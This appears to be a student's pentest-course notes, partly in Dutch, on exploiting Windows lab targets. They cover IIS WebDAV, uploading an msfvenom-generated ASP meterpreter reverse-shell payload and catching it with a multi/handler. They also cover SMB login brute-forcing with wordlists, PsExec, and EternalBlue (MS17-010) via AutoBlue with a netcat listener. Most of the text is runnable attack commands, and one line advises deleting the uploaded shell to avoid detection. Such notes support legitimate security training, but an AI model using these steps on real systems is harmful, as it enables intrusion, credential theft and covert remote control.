
Exploiting WebDAV With Metasploit 

- Start with nmap scan on target to confirm that IIS is running and WebDav is configured 
	- *nmap -sV -p 80 --script=http-enum target* 
- Now lets try to start with a meterpreter session (reverse shell) 
	- MSFvenom is a tool that allows you to generate a payload that provide you with remote/remote access with system (Msfvenom can generate payloads in different formats, such as executable files, shellcode, dynamic-link libraries (DLLs), JavaScript, Python scripts, and more.) 
- *msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your own ip) LPORT=port that is open on your system -f asp > meterpreter.asp* 
	- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > meterpreter.asp 
		- - `msfvenom`: This is the command to execute the msfvenom tool.
		- `-p windows/meterpreter/reverse_tcp`: This parameter specifies the payload to be generated. In this case, it is using the "meterpreter" payload, which is a versatile payload that provides advanced functionality and allows interactive control of the compromised system. It is designed for Windows targets and uses a reverse TCP connection.
		- `LHOST=10.10.5.2`: This parameter specifies the **local IP address (host)** for the reverse connection. You should replace it with the IP address of the system where the listener (the system that will receive the connection) is running. In this case, it is set to `10.10.5.2`.
		- `LPORT=1234`: This parameter specifies the **local port number** for the reverse connection. You should replace it with the port number where the listener is configured to listen for incoming connections. In this case, it is set to `1234`.
		- `-f asp`: This parameter specifies the output format for the generated payload. In this case, it is set to ASP (Active Server Pages). The generated payload will be in the form of an ASP script.
		- `> meterpreter.asp`: This part redirects the output of the msfvenom command to a file named "meterpreter.asp". The generated ASP payload will be saved in this file.

		1. Payload: `windows/meterpreter/reverse_tcp` The `windows/meterpreter/reverse_tcp` payload is a specific type of payload available in the Metasploit Framework. It creates a reverse TCP connection from the target machine to the attacker's machine. Once the connection is established, it allows the attacker to execute commands and interact with the compromised system.
		    
		    In a reverse TCP scenario, the exploited system initiates the connection to the attacker's machine, which is typically listening on a specific IP address (`LHOST`) and port (`LPORT`). This type of connection is useful when the exploited system is behind firewalls or other network restrictions that might prevent direct incoming connections.
		    
		2. Output File: `meterpreter.asp` The `meterpreter.asp` file is the output file generated by the `msfvenom` tool, which is a payload generator within the Metasploit Framework. The `-f asp` flag specifies that the output file should be in ASP format, which is a file extension commonly associated with Active Server Pages.
		    
		    The generated `meterpreter.asp` file contains the payload code in ASP format. When this file is executed on a vulnerable web server, it establishes a reverse TCP connection back to the attacker's machine, allowing them to gain control over the compromised system.
		    
		    In summary, the `windows/meterpreter/reverse_tcp` payload establishes a reverse TCP connection from the target machine to the attacker's machine, while the `meterpreter.asp` file is the output file that contains the payload code in ASP format.



- use cadaver to get sudo shell: cadaver http://target-ip/webdav
	- 'ls' to list the files 
	- use **put** to upload the file that you created: put /root/meterpreter.asp 
- before executing the malicious file we need to set up a listener/handler that will receive the reverse connection from target system and then send the stage which will give you a meterpreter session when executed 
	- start up metasploit framework console session: **service postgresql start && msfconsole**
		-  "service postgresql start": This command starts the PostgreSQL service. PostgreSQL is an open-source relational database management system. The "service" command is used to manage system services in many Linux distributions. In this case, it's starting the PostgreSQL service.
			- PostgreSQL is one of the supported databases for Metasploit, and it can be used as a data store for various features and functionalities within the framework. By default, Metasploit uses an SQLite database, but using PostgreSQL can offer better performance and scalability, especially when dealing with larger datasets or multiple concurrent users.
			- The command "service postgresql start" is used to start the PostgreSQL service if it is installed on the system. It ensures that the PostgreSQL service is up and running, allowing Metasploit to connect to and utilize a PostgreSQL database.
		-  "&&": This is the logical AND operator in shell scripting. It allows you to execute multiple commands sequentially, with the second command executing only if the first command succeeds (i.e., returns an exit status of 0). If the first command fails, the second command won't be executed.
		- "msfconsole": This command launches the Metasploit Framework console. Metasploit is a widely-used open-source penetration testing framework that provides various tools for exploiting vulnerabilities in computer systems. The "msfconsole" command starts the interactive command-line interface for the Metasploit Framework, where you can execute various commands and modules for penetration testing purposes.
		- By combining these commands using "&&", the shell will start the PostgreSQL service and, if successful, proceed to launch the Metasploit Framework console.

- Setting up handler/listener in metasploit by using metasploit module : 
	- use multi/handler 
	- set payload windows/meterpreter/reverse_tcp  (let op dat jouw payload naam overeenkomt met wat je hier invoert)
	- show options 
	- set LHOST  yourip
	- set LPORT  openport 
	- run 
- execute malicious payload by clicking on the file name in webdav browser 
- run sysinfo to see if it was successfull 
- run getuid to check your privileges 

delete shell.asp will delete the file, this is good to do once you have access, to avoid detection 

optie 2 in metasploit 

- search iis upload ![[Pasted image 20230703111527.png]]
- use exploit/windows/iis/iis_webdav_upload_asp
	- show options 
	- set  HttpUsername bob  
	- set  HttpPassword password_123321
	- set RHOST to targtet ip 
	- set Rport 
	- set PATH /webdav/metasploit.asp  (this is what will be uploaded)
	- exploit (this will start reverse tcp handler)



------------------------- LAB -------------------------

![[Pasted image 20230703112538.png]] 

![[Pasted image 20230703121659.png]] ![[Pasted image 20230703121957.png]]
![[Pasted image 20230703122802.png]]
![[Pasted image 20230703122811.png]]
-- 

## Exploiting SMB With PsExec 

- short info about SMB 
	- SMB is a network file sharing protocol that is used to facilitate the sharing of files and peripherals like printers between computers on a local network (LAN)
	- port 445 back in the day above NetBIOS using 139 
	- SAMBA is the open source Linux implementation of SMB and allows Windows systems to access Linux shared and devices 

- SMB authentication 
	- The SMB protocol utilizes two levels of authentication, namely: 
		- User Authentication -> users must provide a username and password in order to authenticate with the SMB server in order to access a share 
		- Share Authentication -> Users must provide a password in order to access restricted share 
	- both of them utilize a challenge response authentication system 
![[Pasted image 20230703123352.png]]

- PsExec 
	- PsExec is a lightweight telnet-replacement developed by Microsoft that allows you to execute processes on remote windows systems using any users credentials 
	- PsExec authentication is performed via SMB 
	- PsExec can be utilized to authenticate with target system legitimately and run arbitrary commands or launch a remote command prompt 
	- very similar to RDP, however, instead of controlling the remote system via GUI (which is the case in RDP), commands are sent via CMD 

PsExec uses the Server Message Block (SMB) protocol for authentication when establishing a connection to remote systems. PsExec is a command-line tool developed by Microsoft Sysinternals that allows for the execution of processes on remote systems. It leverages SMB to authenticate with the remote system and execute commands or run programs.

When PsExec is used to connect to a remote system, it establishes an SMB session to the administrative share (C$) on the target machine. It then uses the provided credentials (username and password) to authenticate and gain access to the remote system. The authentication process relies on the SMB protocol for secure communication and credential validation.

It's worth noting that PsExec requires administrative privileges on the remote system to function properly. Additionally, SMB can use different authentication mechanisms, such as NTLM or Kerberos, depending on the configuration and the environment.

- SMB Exploitation With PsExec 
	- In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate users accounts and their respective passwords or password hashes 
	- this can be done by leveraging various tools and techniques, however most common technique will involve performing an SMB login brute-force attack 
	- brute force attack on administrator 
	- after obtaining legitimate user account and password, we use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell 


- start with service version detection and default script with nmap: nmap -sV -sC 
	- Message signing enabled but not required means you can authenticate with this system via PsExec  ![[Pasted image 20230703124308.png]]
- Perform bruteforce with Metasploit module to get username and password that we can use for psexec 
	- service postgresql start && msfconsole 
	- search smb_login 
		- The auxiliary modules are mainly used for information gathering 
	- use module and show options 
			- set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt 
			- set PASS_FILE /usr/share/metasploit/metasploit-framework/data/wordlists/unix_passwords.txt 
			- set RHOST targetip
			- set verbose false (als je niet alle attempts wilt zien)

open new tab 

- psexec.py (allows you to authenticate with target system)
	- psexec.py Adminstrator@targetip command_that_you_want_to_execute 
		- psexec.py Adminstrator@targetip cmd.exe ![[Pasted image 20230703125815.png]]
		- extend this attack with metasploit module to get meterpreter session 
			- search psexec 
			- use exploit/windows/smb/psexec 
			- show options (set rhost to targetip and set smbpassword en username )

------ LAB -------- 
**Objective:** Exploit the SMB service to get a meterpreter on the target and retrieve the flag!
- Dictionaries to use:
- /usr/share/metasploit-framework/data/wordlists/common_users.txt
- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 

![[Pasted image 20230703152541.png]]![[Pasted image 20230703153551.png]]
![[Pasted image 20230703154518.png]]

### Exploiting Windows MS17-010SMB Vulnerability (EternalBlue)

- EternelBlue is the name given to a collection of Windows vulnerabilities that allows remote code execution 
- Developed by NSA and was leaked by Shadow Brokers in 2017 
- EternelBlue takes advantage of vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands 
- The EternalBlue exploit was used in the WannaCry ransomware attack 
- The vulnerability affects multiple versions of Windows (both 32 and 64 bit)
- Microsoft released a patch in 2017
- The EthernalBlue exploit has a MSF auxiliary module that can be used to check if a target system if vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems. 
- The EthernalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system 
- tool: ![[Pasted image 20230704130440.png]]

Demo 

- Nmap to check smb service: **sudo nmap -sV -p 445 -O target** 
	- -O to check operating system 
- To check if target is vulnerable for eternal blue exploit use the following nmap script: **sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target** 

Manual exploitation: Tool used: https://github.com/3ndG4me/AutoBlue-MS17-010 
1. Clone the repository (in kali repository) (check requirement install python)
2. navigate into shellcode directory 
3. give the shell_prep.sh executable permissions: chmod +x shell_prep.sh 
4. execute the bash script: ./shell_prep.sh 
5. say yes to msfvenom, add ip of kali vm (ifconfig), Lport (the port you want to listen to for the connection once the payload is executed on the target), choose regular shell, select stageless payload ![[Pasted image 20230704140223.png]]
6. set up netcat listner in a different terminal: nc -nvlp 1234 
7. chmod +x externalblue_exploit7.py![[Pasted image 20230704140431.png]]![[Pasted image 20230704140522.png]]
			green = executable 
8. run the exploit: python eternalblue_exploit7.py targetip shellcode/sc_x64.bin 
9. go to terminel with the netcat listner - you see a command shell on the target system 

Automatically exploit eternelblue 
1. open msfconsole 
2. search eternalblue (aux will tell you if the system is vulnerable) (when you know tha the target is vulnerable use the exploit)
3. use: ![[Pasted image 20230704140841.png]]
4. run exploit after fixing the options 



